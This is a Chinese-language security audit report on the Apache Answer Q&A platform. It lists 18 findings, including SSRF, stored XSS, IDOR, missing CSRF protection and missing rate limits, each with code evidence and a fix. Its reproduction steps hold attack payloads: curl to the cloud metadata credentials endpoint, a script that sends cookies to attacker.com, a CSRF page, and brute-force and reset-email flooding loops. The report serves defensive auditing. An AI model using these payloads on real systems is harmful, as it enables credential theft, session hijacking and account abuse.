# Apache Answer Web 代码审计报告

> 每条问题都做到"别人照着你的文字能复现"。

---

## 1. 概览

- 项目名称：Apache Answer（开源问答社区平台）
- 审计范围：全部后端 Go 代码（internal/、pkg/、plugin/）
- 代码版本：main 分支，commit fca80abb
- 审计方式：源码审计 + 数据流追踪
- 审计时间：2026-05-09
- 技术栈：Go 1.24 / Gin / XORM / React

### 1.1 风险结论

- 高危（High）：8 个
- 中危（Medium）：7 个
- 低危（Low）：3 个

---

## 2. 发现列表（按严重度）

| ID | 严重度 | 标题 | 影响 | 位置 |
|---|---|---|---|---|
| V-001 | High | SSRF - Favicon/图标获取无URL校验 | 访问内网服务、云元数据 | pkg/htmltext/htmltext.go:192 |
| V-002 | High | SSRF - AI Provider API地址可控 | 访问内网服务 | internal/controller/ai_controller.go:278 |
| V-003 | High | 存储型XSS - 管理员自定义HTML直接渲染 | 全站用户Cookie窃取 | internal/controller/template_controller.go:604 |
| V-004 | High | 存储型XSS - 用户Bio HTML注入 | 访问者Cookie窃取 | internal/controller/template_controller.go:551 |
| V-005 | High | IDOR - 问题关闭/重开无所有权校验 | 任意用户操控问题状态 | internal/controller/question_controller.go:171 |
| V-006 | High | IDOR - 采纳答案无问题所有权校验 | 任意用户采纳答案 | internal/controller/answer_controller.go:414 |
| V-007 | High | 缺失CSRF防护 | 跨站请求伪造攻击 | 全局（无CSRF中间件） |
| V-008 | High | JSON-LD注入导致XSS | 问题详情页脚本注入 | internal/controller/template_controller.go:380 |
| V-009 | Medium | 开放重定向 - 插件用户中心 | 钓鱼攻击 | internal/controller/plugin_user_center_controller.go:119 |
| V-010 | Medium | CORS通配符配置 | 跨域数据窃取 | internal/controller/ai_controller.go:193 |
| V-011 | Medium | 认证Token通过URL参数传递 | Token泄露至日志/Referer | internal/base/middleware/auth.go:62 |
| V-012 | Medium | 登录/密码重置无速率限制 | 暴力破解 | internal/base/middleware/rate_limit.go |
| V-013 | Medium | Gravatar Base URL可控 | 用户邮箱哈希泄露 | internal/schema/siteinfo_schema.go:77 |
| V-014 | Medium | 评论删除无所有权校验 | 任意删除他人评论 | internal/service/comment/comment_service.go:266 |
| V-015 | Medium | 缺失安全响应头 | 降低XSS防御纵深 | internal/controller/template_controller.go:613 |
| V-016 | Low | Markdown渲染kbd标签绕过 | 有限XSS | pkg/converter/markdown.go:112 |
| V-017 | Low | Snowflake ID使用math/rand | ID可预测 | pkg/uid/id.go:36 |
| V-018 | Low | 速率限制键使用MD5 | 哈希碰撞绕过限流 | internal/base/middleware/rate_limit.go:52 |

---

## 3. 详细发现

### V-001：SSRF - Favicon/图标获取无URL校验

- **严重度**：High
- **影响面**：可访问服务器内网任意HTTP服务、云元数据端点、进行端口扫描
- **前置条件**：需要管理员权限修改站点品牌设置

#### 3.1 位置与证据

- 文件：`pkg/htmltext/htmltext.go`
- 函数：`func GetPicByUrl(url string) string`

```go
// pkg/htmltext/htmltext.go:192-205
func GetPicByUrl(url string) string {
    res, err := http.Get(url)  // 无任何URL校验，直接发起HTTP请求
    if err != nil {
        return ""
    }
    defer func() {
        _ = res.Body.Close()
    }()
    pix, err := io.ReadAll(res.Body)  // 读取完整响应体
    if err != nil {
        return ""
    }
    return string(pix)  // 返回原始内容
}
```

调用点 `internal/router/ui.go:109-119`：
```go
case "/favicon.ico":
    branding, err := a.siteInfoService.GetSiteBranding(c)
    if branding != nil && branding.Favicon != "" {
        c.String(http.StatusOK, htmltext.GetPicByUrl(branding.Favicon))
        return
    } else if branding != nil && branding.SquareIcon != "" {
        c.String(http.StatusOK, htmltext.GetPicByUrl(branding.SquareIcon))
        return
    }
```

#### 3.2 触发与复现思路

- 入口参数：管理员通过 Admin API 设置 Branding Favicon URL
- 数据流：Admin设置Favicon URL → 存入数据库 → 用户访问/favicon.ico → 服务端发起HTTP GET到该URL → 响应内容返回给用户

```bash
# 1. 管理员设置恶意favicon URL（指向AWS元数据）
curl -X PUT 'http://target/answer/admin/api/siteinfo/branding' \
  -H 'Authorization: Bearer <admin_token>' \
  -H 'Content-Type: application/json' \
  -d '{"favicon": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# 2. 任意用户访问favicon触发SSRF
curl 'http://target/favicon.ico'
# 响应将包含AWS IAM凭证信息
```

#### 3.3 修复建议

- 实现URL白名单校验，仅允许HTTPS协议
- 禁止私有IP段（10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16）
- 设置HTTP客户端超时和响应体大小限制

#### 3.4 修复后验证

- 尝试设置favicon为内网地址，验证被拒绝
- 尝试设置为云元数据地址，验证被拒绝

---

### V-002：SSRF - AI Provider API地址可控

- **严重度**：High
- **影响面**：服务端向管理员指定的任意URL发送HTTP请求（含API Key header）
- **前置条件**：需要管理员权限

#### 3.1 位置与证据

- 文件：`internal/controller/ai_controller.go`
- 函数：`func (c *AIController) createOpenAIClient()`

```go
// internal/controller/ai_controller.go:278-301
func (c *AIController) createOpenAIClient() *openai.Client {
    aiProvider := aiConfig.GetProvider()
    config = openai.DefaultConfig(aiProvider.APIKey)
    config.BaseURL = aiProvider.APIHost  // 管理员可控，无URL校验
    if !strings.HasSuffix(config.BaseURL, "/v1") {
        config.BaseURL += "/v1"
    }
    return openai.NewClientWithConfig(config)
}
```

Schema定义无URL格式校验：
```go
// internal/schema/siteinfo_schema.go:283-287
type SiteAIProvider struct {
    APIHost string `validate:"omitempty,lte=512" form:"api_host" json:"api_host"` // 仅长度校验
}
```

#### 3.2 触发与复现思路

- 入口参数：管理员通过 Admin API 设置 AI Provider 配置
- 数据流：Admin设置APIHost → 存入数据库 → 用户触发AI功能 → 服务端向该URL发送POST请求（含Authorization header）

```bash
# 管理员设置AI API地址为内网服务
curl -X PUT 'http://target/answer/admin/api/siteinfo/ai' \
  -H 'Authorization: Bearer <admin_token>' \
  -H 'Content-Type: application/json' \
  -d '{"enabled":true,"providers":[{"provider":"openai","api_host":"http://localhost:6379","api_key":"x","model":"gpt-4"}]}'

# 触发AI功能时，服务端将向 http://localhost:6379/v1/chat/completions 发送POST请求
# 可用于探测内网Redis、数据库等服务端口
```

#### 3.3 修复建议

- 对APIHost实施URL格式校验，仅允许HTTPS
- 禁止私有IP和localhost
- 可选：维护允许的AI服务域名白名单

#### 3.4 修复后验证

- 设置APIHost为内网地址，验证被拒绝
- 设置为合法OpenAI地址，验证功能正常

---

### V-003：存储型XSS - 管理员自定义HTML直接渲染

- **严重度**：High
- **影响面**：全站所有页面、所有用户（包括其他管理员）
- **前置条件**：需要管理员权限

#### 3.1 位置与证据

- 文件：`internal/controller/template_controller.go:604-606`

```go
data["HeadCode"] = siteInfo.CustomCssHtml.CustomHead
data["HeaderCode"] = siteInfo.CustomCssHtml.CustomHeader
data["FooterCode"] = siteInfo.CustomCssHtml.CustomFooter
```

模板渲染 `ui/template/header.html:82,88`：
```html
{{if .HeadCode }} {{.HeadCode | templateHTML}} {{end}}
{{if .HeaderCode }} {{.HeaderCode | templateHTML}} {{end}}
```

`templateHTML`函数绕过Go模板自动转义：
```go
// internal/base/server/http_funcmap.go:60-62
"templateHTML": func(data string) template.HTML {
    return template.HTML(data)  // 直接转为template.HTML，绕过转义
},
```

#### 3.2 触发与复现思路

- 入口参数：管理员通过 Admin API 设置自定义 CSS/HTML
- 数据流：Admin设置CustomHead → 存入数据库 → 任意页面渲染时通过templateHTML直接输出 → 浏览器执行脚本

```bash
# 管理员注入恶意脚本（可用于权限提升：窃取超级管理员cookie）
curl -X PUT 'http://target/answer/admin/api/siteinfo/custom-css-html' \
  -H 'Authorization: Bearer <admin_token>' \
  -H 'Content-Type: application/json' \
  -d '{"custom_head":"<script>fetch(\"http://attacker.com/steal?c=\"+document.cookie)</script>"}'

# 任何用户访问站点任意页面时，脚本自动执行
```

#### 3.3 修复建议

- 对CustomHead/Header/Footer使用bluemonday严格策略过滤
- 或仅允许CSS（style标签），禁止script标签和事件属性
- 实施CSP头限制inline script执行

#### 3.4 修复后验证

- 注入script标签，验证被过滤或CSP阻止执行
- 注入合法CSS，验证功能正常

---

### V-004：存储型XSS - 用户Bio HTML注入

- **严重度**：High
- **影响面**：所有查看攻击者个人资料页面的用户
- **前置条件**：普通注册用户即可

#### 3.1 位置与证据

- 文件：`internal/controller/template_controller.go:551`

```go
"bio": template.HTML(userinfo.BioHTML),  // 直接作为template.HTML渲染，绕过自动转义
```

Bio HTML生成过程 `pkg/converter/markdown.go:69-77`：
```go
func Markdown2BasicHTML(source string) string {
    content := Markdown2HTML(source)
    filter := bluemonday.NewPolicy()
    filter.AllowElements("p", "b", "br", "strong", "em")
    filter.AllowAttrs("src").OnElements("img")  // 允许img的src属性
    filter.AddSpaceWhenStrippingTag(true)
    content = filter.Sanitize(content)
    return content
}
```

#### 3.2 触发与复现思路

- 入口参数：用户通过API更新个人Bio字段
- 数据流：用户设置Bio markdown → Markdown2BasicHTML转换 → 存储BioHTML → 个人资料页通过template.HTML()直接渲染

bluemonday策略允许`<img src=...>`但不允许事件属性（onerror等）。主要风险在于：
1. `template.HTML()`意味着如果bluemonday有任何绕过，将直接导致XSS
2. `<img src="http://attacker.com/track">` 可用于用户追踪
3. 如果BioHTML在其他上下文（RSS、邮件通知）中使用，可能绕过sanitizer

```bash
# 用户设置bio触发外部请求（用户追踪）
curl -X PUT 'http://target/answer/api/v1/user/info' \
  -H 'Authorization: Bearer <user_token>' \
  -H 'Content-Type: application/json' \
  -d '{"bio":"![](http://attacker.com/track?visitor=1)"}'
```

#### 3.3 修复建议

- 移除template.HTML()包装，使用Go模板自动转义
- 或在渲染前再次通过bluemonday过滤
- 限制img src仅允许同域URL

#### 3.4 修复后验证

- 设置bio包含img标签指向外部URL，验证被过滤
- 设置正常markdown bio，验证显示正常

---

### V-005：IDOR - 问题关闭/重开无所有权校验

- **严重度**：High
- **影响面**：任何达到一定声望值的用户可关闭/重开平台上任意问题
- **前置条件**：需要登录且拥有QuestionClose/QuestionReopen权限（通过声望获得）

#### 3.1 位置与证据

- 文件：`internal/controller/question_controller.go:171-190`

```go
func (qc *QuestionController) CloseQuestion(ctx *gin.Context) {
    req := &schema.CloseQuestionReq{}
    handler.BindAndCheck(ctx, req)
    req.UserID = middleware.GetLoginUserIDFromContext(ctx)
    // 关键：objectID传空字符串""，导致所有权检查被跳过
    can, err := qc.rankService.CheckOperationPermission(ctx, req.UserID, permission.QuestionClose, "")
    if !can {
        handler.HandleResponse(ctx, errors.Forbidden(...), nil)
        return
    }
    err = qc.questionService.CloseQuestion(ctx, req)
}
```

权限检查逻辑 `internal/service/rank/rank_service.go:87-121`：
```go
func (rs *RankService) CheckOperationPermission(..., objectID string) (can bool, err error) {
    powerMapping := rs.getUserPowerMapping(ctx, userID)
    if powerMapping[action] {
        return true, nil  // 仅检查rank权限，不检查资源所有权
    }
    if len(objectID) > 0 {  // objectID为""时，此分支完全跳过！
        objectInfo, _ := rs.objectInfoService.GetInfo(ctx, objectID)
        if objectInfo.ObjectCreatorUserID == userID {
            return true, nil
        }
    }
    can, _ = rs.checkUserRank(ctx, userInfo.ID, userInfo.Rank, PermissionPrefix+action)
    return can, nil
}
```

#### 3.2 触发与复现思路

- 入口参数：POST body中的question ID
- 数据流：用户提交关闭请求 → 权限检查仅验证rank → 直接关闭目标问题

```bash
# 用户A（有QuestionClose权限）关闭用户B的问题
curl -X PUT 'http://target/answer/api/v1/question/status' \
  -H 'Authorization: Bearer <userA_token>' \
  -H 'Content-Type: application/json' \
  -d '{"id":"<userB_question_id>","status":"closed","close_type":1,"close_msg":"spam"}'

# 重开任意问题
curl -X PUT 'http://target/answer/api/v1/question/reopen' \
  -H 'Authorization: Bearer <userA_token>' \
  -H 'Content-Type: application/json' \
  -d '{"question_id":"<any_question_id>"}'
```

#### 3.3 修复建议

- 将问题ID作为objectID传入CheckOperationPermission
- 或在service层增加所有权校验：`if req.UserID != questionInfo.UserID { return forbidden }`

#### 3.4 修复后验证

- 非问题所有者尝试关闭问题，验证返回403
- 问题所有者关闭自己的问题，验证成功

---
### V-006：IDOR - 采纳答案无问题所有权校验

- **严重度**：High
- **影响面**：任何有AnswerAccept权限的用户可在任意问题上采纳答案
- **前置条件**：需要登录且拥有AnswerAccept权限（通过声望获得）

#### 3.1 位置与证据

- 文件：`internal/controller/answer_controller.go:414-435`

```go
func (ac *AnswerController) AcceptAnswer(ctx *gin.Context) {
    req := &schema.AcceptAnswerReq{}
    handler.BindAndCheck(ctx, req)
    req.UserID = middleware.GetLoginUserIDFromContext(ctx)
    req.AnswerID = uid.DeShortID(req.AnswerID)
    req.QuestionID = uid.DeShortID(req.QuestionID)
    // 传入QuestionID，但如果用户rank足够高，powerMapping直接返回true，跳过所有权检查
    can, _ := ac.rankService.CheckOperationPermission(ctx, req.UserID, permission.AnswerAccept, req.QuestionID)
    if !can {
        handler.HandleResponse(ctx, errors.Forbidden(...), nil)
        return
    }
    err = ac.answerService.AcceptAnswer(ctx, req)
}
```

#### 3.2 触发与复现思路

```bash
# 高声望用户采纳他人问题的答案
curl -X POST 'http://target/answer/api/v1/answer/acceptance' \
  -H 'Authorization: Bearer <high_rank_user_token>' \
  -H 'Content-Type: application/json' \
  -d '{"question_id":"<others_question_id>","answer_id":"<answer_id>"}'
```

#### 3.3 修复建议

- 在AcceptAnswer service层验证 req.UserID == questionInfo.UserID
- 或修改权限逻辑，AnswerAccept不应通过rank直接授权

#### 3.4 修复后验证

- 非问题所有者尝试采纳答案，验证返回403

---

### V-007：缺失CSRF防护

- **严重度**：High
- **影响面**：所有状态变更操作可被跨站伪造
- **前置条件**：受害者已登录并访问攻击者控制的页面

#### 3.1 位置与证据

- 全局搜索未发现CSRF中间件、CSRF Token生成或验证逻辑
- 认证同时支持Cookie方式（`internal/controller/user_controller.go` 中 `setVisitCookies` 设置HttpOnly cookie）

#### 3.2 触发与复现思路

- 数据流：受害者浏览器自动携带Cookie → 攻击者页面发起跨站请求 → 服务端认为是合法请求

```html
<!-- 攻击者页面：自动关闭受害者的问题 -->
<script>
fetch('http://target/answer/api/v1/question/status', {
  method: 'PUT',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({id:'target_question_id', status:'closed', close_type:1})
});
</script>
```

注意：如果认证仅通过Authorization Header（非Cookie），则CSRF风险降低。需验证Cookie认证路径。

#### 3.3 修复建议

- 实施CSRF Token机制（SameSite Cookie + Double Submit）
- 或确保所有状态变更操作仅接受Header中的Bearer Token

#### 3.4 修复后验证

- 从不同域发起跨站请求，验证被拒绝

---

### V-008：JSON-LD注入导致XSS

- **严重度**：High（理论风险，实际利用受限）
- **影响面**：问题详情页所有访问者
- **前置条件**：普通注册用户（可发布问题/答案）

#### 3.1 位置与证据

- 文件：`internal/controller/template_controller.go:380-422`

```go
jsonLD := &schema.QAPageJsonLD{}
jsonLD.MainEntity.Name = detail.Title       // 用户可控
jsonLD.MainEntity.Text = detail.HTML        // 用户可控
jsonLDStr, err := json.Marshal(jsonLD)
if err == nil {
    // 字符串拼接构造script标签
    siteInfo.JsonLD = `<script data-react-helmet="true" type="application/ld+json">` + string(jsonLDStr) + ` </script>`
}
```

#### 3.2 触发与复现思路

Go的`json.Marshal`默认对`<`、`>`、`&`进行Unicode转义，因此直接注入HTML标签较困难。但：
1. 如果使用`json.NewEncoder`并设置`SetEscapeHTML(false)`，则可被利用
2. 字符串拼接模式本身不安全，未来代码变更可能引入漏洞
3. 某些特殊Unicode序列可能绕过

实际利用难度较高，但代码模式存在风险。

#### 3.3 修复建议

- 使用模板引擎的JSON输出功能而非字符串拼接
- 或对jsonLDStr进行额外的HTML实体编码

#### 3.4 修复后验证

- 创建包含`</script>`的问题标题，验证不会破坏页面结构

---

### V-009：开放重定向 - 插件用户中心

- **严重度**：Medium
- **影响面**：可将用户重定向到钓鱼站点
- **前置条件**：安装了用户中心插件

#### 3.1 位置与证据

- 文件：`internal/controller/plugin_user_center_controller.go:119,129`

```go
ctx.Redirect(http.StatusFound, redirectURL)  // redirectURL来自插件返回值，无域名校验
```

#### 3.2 触发与复现思路

如果插件返回的redirectURL可被用户通过参数控制（如OAuth回调中的state/redirect参数），攻击者可构造：
```
http://target/user-center/login/redirect?redirect=http://evil.com/phishing
```

#### 3.3 修复建议

- 对redirectURL进行域名白名单校验
- 仅允许重定向到同域URL

---

### V-010：CORS通配符配置

- **严重度**：Medium
- **影响面**：AI聊天端点可被任意域名跨域访问
- **前置条件**：用户已登录

#### 3.1 位置与证据

- 文件：`internal/controller/ai_controller.go:193-194`

```go
ctx.Header("Access-Control-Allow-Origin", "*")
ctx.Header("Access-Control-Allow-Headers", "Cache-Control")
```

#### 3.2 触发与复现思路

```javascript
// 攻击者网站可跨域读取AI SSE流
const es = new EventSource('http://target/answer/api/v1/ai/chat/stream?msg=...');
es.onmessage = (e) => { sendToAttacker(e.data); };
```

注意：`Access-Control-Allow-Origin: *` 不允许携带credentials，但如果认证通过URL参数传递（V-011），则可绕过。

#### 3.3 修复建议

- 将CORS Origin设置为具体的前端域名
- 或动态校验Origin header

---

### V-011：认证Token通过URL参数传递

- **严重度**：Medium
- **影响面**：Token可能泄露到服务器日志、浏览器历史、Referer头、代理日志
- **前置条件**：使用URL参数方式传递Token

#### 3.1 位置与证据

- 文件：`internal/base/middleware/auth.go:62-66`

```go
func ExtractToken(ctx *gin.Context) (token string) {
    token = ctx.GetHeader("Authorization")
    if token == "" {
        token = ctx.Query("Authorization")  // 回退到URL参数
    }
    // ...
}
```

#### 3.2 触发与复现思路

```bash
# Token出现在URL中，会被记录到：
# 1. Web服务器访问日志
# 2. 浏览器历史记录
# 3. 反向代理日志
# 4. Referer头（跳转到外部链接时）
curl 'http://target/answer/api/v1/user/info?Authorization=Bearer+<token>'
```

#### 3.3 修复建议

- 移除URL参数认证支持
- 如必须保留（如SSE等场景），使用短期一次性token

---

### V-012：登录/密码重置无速率限制

- **严重度**：Medium
- **影响面**：可暴力破解用户密码或滥用密码重置邮件
- **前置条件**：无

#### 3.1 位置与证据

- 文件：`internal/base/middleware/rate_limit.go`
- 现有限流仅为`DuplicateRequestRejection`（防止完全相同的请求重复提交），不防暴力破解

#### 3.2 触发与复现思路

```bash
# 暴力破解登录（无速率限制阻止）
for pass in $(cat wordlist.txt); do
  curl -s -X POST 'http://target/answer/api/v1/user/login/email' \
    -H 'Content-Type: application/json' \
    -d "{\"email\":\"victim@example.com\",\"pass\":\"$pass\"}"
done

# 密码重置邮件轰炸
for i in $(seq 1 1000); do
  curl -s -X POST 'http://target/answer/api/v1/user/password/reset' \
    -H 'Content-Type: application/json' \
    -d '{"email":"victim@example.com"}'
done
```

#### 3.3 修复建议

- 对登录端点实施IP+账户维度的速率限制（如5次/分钟）
- 对密码重置实施邮箱维度的冷却时间（如1次/5分钟）
- 登录失败N次后要求验证码

---

### V-013：Gravatar Base URL可控导致邮箱哈希泄露

- **严重度**：Medium
- **影响面**：所有用户的邮箱MD5哈希泄露给攻击者控制的服务器
- **前置条件**：需要管理员权限

#### 3.1 位置与证据

- 文件：`internal/schema/siteinfo_schema.go:77-82`

```go
type SiteUsersSettingsReq struct {
    GravatarBaseURL string `validate:"omitempty" json:"gravatar_base_url"` // 无URL格式校验
}
```

使用位置 `internal/service/siteinfo_common/siteinfo_service.go:140-152`：
```go
if len(usersConfig.GravatarBaseURL) > 0 {
    gravatarBaseURL = usersConfig.GravatarBaseURL  // 直接使用
}
// 后续拼接用户邮箱MD5哈希作为头像URL
```

#### 3.2 触发与复现思路

```bash
# 管理员设置恶意Gravatar地址
curl -X PUT 'http://target/answer/admin/api/siteinfo/users' \
  -H 'Authorization: Bearer <admin_token>' \
  -H 'Content-Type: application/json' \
  -d '{"default_avatar":"gravatar","gravatar_base_url":"http://attacker.com/avatar/"}'

# 所有用户头像请求将发送到 http://attacker.com/avatar/<email_md5_hash>
# 攻击者可收集所有用户的邮箱MD5哈希，用于彩虹表反查
```

#### 3.3 修复建议

- 对GravatarBaseURL实施域名白名单（gravatar.com, cdn.libravatar.org等）
- 或添加URL格式校验，仅允许HTTPS

---

### V-014：评论删除无所有权校验

- **严重度**：Medium
- **影响面**：有CommentDelete权限的用户可删除平台上任意评论
- **前置条件**：需要CommentDelete权限

#### 3.1 位置与证据

- 文件：`internal/service/comment/comment_service.go:266-274`

```go
func (cs *CommentService) RemoveComment(ctx context.Context, req *schema.RemoveCommentReq) (err error) {
    err = cs.commentRepo.RemoveComment(ctx, req.CommentID)  // 直接删除，无所有权验证
    if err != nil {
        return err
    }
    cs.eventQueueService.Send(ctx, schema.NewEvent(constant.EventCommentDelete, req.UserID).
        TID(req.CommentID).CID(req.CommentID, req.UserID))
    return nil
}
// 对比：同文件 UpdateComment (line 287) 有所有权检查
```

#### 3.2 触发与复现思路

```bash
# 有CommentDelete权限的用户删除他人评论
curl -X DELETE 'http://target/answer/api/v1/comment' \
  -H 'Authorization: Bearer <user_token>' \
  -H 'Content-Type: application/json' \
  -d '{"comment_id":"<others_comment_id>"}'
```

#### 3.3 修复建议

- 在RemoveComment中增加所有权校验，参考UpdateComment的实现

---

### V-015：缺失安全响应头

- **严重度**：Medium
- **影响面**：降低XSS、点击劫持等攻击的防御纵深
- **前置条件**：无

#### 3.1 位置与证据

- 文件：`internal/controller/template_controller.go:613`

仅设置了：
```go
ctx.Header("X-Frame-Options", "DENY")
```

缺失的关键安全头：
- `Content-Security-Policy` - 无CSP限制脚本来源
- `X-Content-Type-Options: nosniff` - 无MIME类型嗅探防护
- `Strict-Transport-Security` - 无HSTS
- `Permissions-Policy` - 无功能策略限制

#### 3.2 触发与复现思路

缺失CSP使得V-003、V-004等XSS漏洞无额外防御层。

#### 3.3 修复建议

- 添加CSP: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'`
- 添加 `X-Content-Type-Options: nosniff`
- 添加 `Strict-Transport-Security: max-age=31536000; includeSubDomains`

---

### V-016：Markdown渲染kbd标签绕过sanitizer

- **严重度**：Low
- **影响面**：有限的HTML注入（仅kbd标签）
- **前置条件**：普通用户

#### 3.1 位置与证据

- 文件：`pkg/converter/markdown.go:112-113`

```go
if string(source[segment.Start:segment.Stop]) == "<kbd>" || string(source[segment.Start:segment.Stop]) == "</kbd>" {
    _, _ = w.Write(segment.Value(source))  // 直接写入，不经过bluemonday
}
```

#### 3.2 触发与复现思路

仅允许精确匹配`<kbd>`和`</kbd>`，实际XSS利用困难。但可用于轻微的HTML结构破坏。

---

### V-017：Snowflake ID使用math/rand初始化

- **严重度**：Low
- **影响面**：节点ID理论上可预测
- **前置条件**：无

#### 3.1 位置与证据

- 文件：`pkg/uid/id.go:36-44`

```go
source := rand.NewSource(time.Now().UnixNano())  // math/rand，种子为启动时间
r := rand.New(source)
node, _ := snowflake.NewNode(int64(r.Intn(1000)) + 1)
```

#### 3.2 触发与复现思路

如果攻击者知道服务启动时间，可推算节点ID，进而预测生成的Snowflake ID序列。实际利用价值有限。

---

### V-018：速率限制键使用MD5哈希

- **严重度**：Low
- **影响面**：理论上可构造哈希碰撞绕过限流
- **前置条件**：无

#### 3.1 位置与证据

- 文件：`internal/base/middleware/rate_limit.go:52`

```go
key = encryption.MD5(fmt.Sprintf("%s:%s:%s", userID, fullPath, string(reqJson)))
```

#### 3.2 触发与复现思路

MD5碰撞攻击可使不同请求产生相同的限流key，但实际利用需要精心构造碰撞输入，难度较高。

---

## 4. 架构级风险与改进建议

### 认证/鉴权模型
- 权限检查依赖声望系统（rank），但资源级所有权验证不一致
- `CheckOperationPermission`设计缺陷：当objectID为空时跳过所有权检查
- 建议：在service层统一添加资源所有权校验，不依赖controller传入objectID

### SSRF防护
- 所有接受URL的配置项（Favicon、AI API、Gravatar、MCP）均无URL校验
- 建议：实现统一的URL校验工具函数，禁止私有IP、localhost、元数据端点

### XSS防护
- `template.HTML()`的使用绕过了Go模板的自动转义安全机制
- 建议：审计所有`template.HTML()`使用点，确保输入已经过严格sanitization
- 实施CSP头作为纵深防御

### 限流与暴力破解防护
- 登录、密码重置等敏感端点缺乏针对性的速率限制
- 建议：对认证相关端点实施IP+账户维度的速率限制，失败N次后锁定或要求验证码
